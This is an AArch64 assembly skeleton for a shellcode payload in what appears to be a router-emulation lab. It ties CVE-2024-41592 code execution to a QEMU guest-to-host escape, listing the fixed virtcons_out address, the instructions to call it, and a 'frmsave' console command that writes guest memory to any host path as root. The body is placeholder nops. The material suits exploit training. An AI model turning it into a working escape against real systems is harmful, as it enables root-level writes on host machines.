/*
 * payload.s -- DrayOS in-guest shellcode skeleton for the VigorEmu lab.
 *
 * This is scaffolding only. The escape body is left as a placeholder for you
 * to fill in and assemble yourself.
 *
 * Target: AArch64 ILP32, DrayOS running as a QEMU guest. No NX, no ASLR --
 * the bytes run wherever they are loaded and every address is fixed.
 *
 * Build:
 *   aarch64-linux-gnu-as payload.s -o payload.o
 *   aarch64-linux-gnu-objcopy -O binary payload.o payload.bin
 *   python3 make-elf.py --bin payload.bin
 * (any A64 assembler that can emit a flat binary works -- as, clang, keystone)
 *
 * How you get here at runtime:
 *   CVE-2024-41592 gives PC control on a no-cleanup handler (see
 *   cve-2024-41592/README.md). The saved lr is left as a pointer to your
 *   field bytes; RET lands here. You can also just load payload.bin at the
 *   scratch address and jump to it under gdb to test in isolation.
 *
 * The escape (documented in gen-frmsave.py, not reproduced here):
 *   virtcons_out(w0 = buf, w1 = len)              @ 0x40422e20
 *   QEMU's flush_buf parses a guest console write of the form
 *       frmsave <addr> <size> <path>\n
 *   and dumps <size> bytes of guest memory at <addr> to the host <path>,
 *   as root, with no path check.
 *
 * Calling convention / registers:
 *   - args in w0, w1 (ILP32: pointers are 32-bit)
 *   - virtcons_out follows AAPCS, so x19-x28 survive the call
 *   - x16/x17 (IP0/IP1) are call-clobbered scratch -- fine for the target addr
 */

    .arch armv8-a
    .text
    .global _start
_start:
    mov     x19, x30                 // save the return address you arrived with

    /* ================= YOUR PAYLOAD HERE =================================
     *
     * 1. Put a "frmsave <addr> <size> <path>\n" string somewhere in memory
     *    and load its address into w0 and its byte length into w1.
     *    (Build the string on the stack, or point at one you staged. The
     *     command format and an example layout are in gen-frmsave.py.)
     *
     * 2. Call virtcons_out. Its address is fixed (no ASLR):
     *
     *        movz    w16, #0x2e20
     *        movk    w16, #0x4042, lsl #16    // x16 = 0x40422e20
     *        blr     x16                      // virtcons_out(w0, w1)
     *
     * 3. If you need to keep the router alive after the escape, fall through
     *    to the epilogue below (it restores x30 and returns to wherever you
     *    were called from). Otherwise replace the epilogue with `b .` to spin.
     *
     * ==================================================================== */

    // nop-filled placeholder so this assembles to a valid, harmless image
    nop
    nop

    mov     x30, x19                 // restore return
    ret
